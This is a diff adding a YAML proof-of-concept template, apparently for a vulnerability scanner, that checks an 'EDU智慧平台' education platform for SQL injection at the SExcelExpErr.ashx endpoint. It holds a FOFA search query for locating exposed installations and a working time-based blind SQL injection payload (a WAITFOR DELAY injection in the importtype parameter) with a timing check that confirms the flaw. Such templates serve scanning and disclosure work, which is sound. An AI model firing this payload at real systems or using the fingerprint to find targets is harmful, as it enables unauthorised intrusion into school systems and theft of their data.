@@ -1,0 +1,18 @@
+id: poc-yaml-edu-system-sexcelexperr-sqli
+info:
+  name: EDU智慧平台 SExcelExpErr SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: EDU智慧平台
+  fofa: body="custom/blue/uimaker/easyui.css"
+variables:
+  t1: random_int(1,4)
+  t2: t1 + t1 + t1
+  t3: t2 + 2
+requests:
+- method: GET
+  path: /ashx/KQ/SExcelExpErr.ashx?action=list&importtype=1%27%3BWAITFOR+DELAY+%270%3A0%3A{{.t1}}%27--
+  expression: "status_code == 200 && \ncontains(body,`{\"total\":0,\"rows\":[]}`)\
+    \ &&\nduration >= t2 &&\nduration <= t3\n"
+transport: http
